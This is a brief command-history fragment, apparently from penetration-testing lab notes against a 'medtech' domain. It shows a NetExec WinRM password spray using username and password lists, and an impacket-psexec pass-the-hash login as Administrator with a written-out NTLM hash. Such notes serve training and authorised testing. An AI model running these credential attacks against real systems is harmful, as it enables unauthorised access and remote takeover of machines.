...
# Command History
```c
    nxc winrm 172.16.152.83 -u usernames.txt -p passwords.txt --local-auth
    sudo impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:c33b5cf9fa1b1bb4894d4a6cd7c54034 medtech/Administrator@172.16.152.83
